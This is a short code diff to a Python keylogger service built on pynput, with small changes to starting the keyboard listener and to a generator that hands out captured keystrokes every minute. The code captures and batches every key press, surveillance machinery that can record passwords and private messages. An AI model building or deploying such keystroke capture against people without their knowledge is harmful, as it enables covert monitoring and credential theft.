@@ -1,4 +1,3 @@
-import time
 from pynput import keyboard
 import threading
 
@@ -14,6 +13,7 @@ class KeyLoggerService:
 
 
     def start_listener(self):
+        self.stop_event.clear()
         self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
         self.keyboard_listener.start()
 
@@ -36,12 +36,13 @@ class KeyLoggerService:
                 print('Error: ', e)
 
     def send_every_minute(self):
-        while not self.stop_event.wait(60):  
+        while not self.stop_event.wait(60):
             with self.lock:
                 buffer = self.key_buffer.copy()
                 if buffer:
                     self.clean_buffer()
                     yield buffer
+
 
     def stop_listener(self):
         self.stop_event.set()
